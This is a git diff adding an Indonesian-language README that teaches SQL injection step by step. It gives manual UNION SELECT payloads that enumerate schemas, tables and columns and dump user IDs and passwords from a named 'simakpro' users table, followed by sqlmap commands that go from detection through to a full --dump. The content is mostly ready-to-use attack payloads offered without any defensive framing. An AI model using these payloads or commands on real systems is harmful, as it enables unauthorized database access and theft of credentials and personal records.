@@ -1,2 +1,58 @@
-# SQL_INJECTION
-Computer Security with SQL injection 
+## Langkah-langkah melakukan SQL Injection secara manual
+* Mencari tahu apakah inputan memiliki vuln untuk dilakukan sql injection dengan memasukan karakter `' atau "` pada value inputan
+* Apabila terdapat vuln, maka masukan script `' ORDER BY n #`, Cth: `' ORDER BY 1 #`, `' ORDER BY 2 #`, `' ORDER BY 3 #`, dst sampai menemukan error, Script ini berguna untuk mengetahui jumlah tables dalam database.
+* Apabila memasukan script di URL maka gunakan `' --+`, apabila di inputan maka gunakan `' #` (`--+` penutup script di URL, `#` penutup script di inputan).
+* Selanjutnya jika sudah diketahui banyaknya tables, maka jalankan script berikut, Cth:
+```bash
+' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 #
+```
+* Selanjutnya, untuk mengetahui user dan nama database yang digunakan menggunakan script berikut, Cth:
+```bash
+' UNION ALL SELECT 1,2,3,user(),5,6,7,database(),9,10 #
+```
+
+* Selanjutnya, untuk mengetahui list database yang tersimpan pada MYSQL, menggunakan script berikut, Cth:
+```bash
+' UNION ALL SELECT 1,2,3,schema_name,5,6,7,8,9,10 FROM information_schema.schemata #
+```
+
+* Selanjutnya, untuk mendapatkan list tables dari database tertentu, menggunakan script berikut, Cth:
+```bash
+' UNION SELECT 1,2,3,table_name,5,6,7,8,9,10 FROM information_schema.tables WHERE table_schema = 'simakpro' #
+```
+
+* Selanjutnya, untuk mendapatkan informasi yang lebih spesifik kolom-kolom dari sebuah table, menggunakan script berikut, Cth:
+```bash
+' UNION SELECT 1,2,3,column_name,5,6,7,column_type,9,10 FROM information_schema.columns WHERE table_schema = 'simakpro'  AND table_name = 'users' #
+```
+
+* Terakhir, untuk mendapatkan record data dalam table yang dipilih, menggunakan script berikut, Cth:
+```bash
+' UNION SELECT 1,2,3,CONCAT(usrid,' - ',passwd,' - ',level, ' - ', type_user),5,6,7,8,9,10 FROM simakpro.users #
+```
+
+* Tambahan, Apabila column input tidak bisa menampilkan data secara perulangan maka bisa menggunakan fungsi: `GROUP_CONCAT(variable_name)`, Cth: `' UNION SELECT 1,GROUP_CONCAT(schema_name) FROM information_schema.schemata #`
+
+
+## Langkah-langkah melakukan SQL Injection secara otomatis menggunakan SQLMAP
+* Mencari tahu apakah aplikasi website memiliki vuln sql injection dengan memasukan script ' secara manual ke inputan.
+* Selanjutnya, Masukan perintah berikut untuk mengetahui vuln sql injectionnya
+```bash
+sqlmap -u "linkinputvulnSqlInjection"
+```
+* Selanjutnya, Masukan perintah berikut untuk mengetahui daftar isi databasenya
+```bash
+sqlmap -u "linkinputvulnSqlInjection" --dbs
+```
+* Selanjutnya, Masukan perintah berikut untuk melihat daftar tables didalam database yang dipilih
+```bash
+sqlmap -u "linkinputvulnSqlInjection" -D db_name --tables
+```
+* Selanjutnya, Masukan perintah berikut untuk melihat struktur tables yang dipilih
+```bash
+sqlmap -u "linkinputvulnSqlInjection" -D db_name -T table_name --columns
+```
+* Terakhir, Masukan perintah berikut untuk melihat record data didalam tables dari nama columns yang dipilih
+```bash
+sqlmap -u "linkinputvulnSqlInjection" -D db_name -T table_name name_columns,name_columns --dump
+```
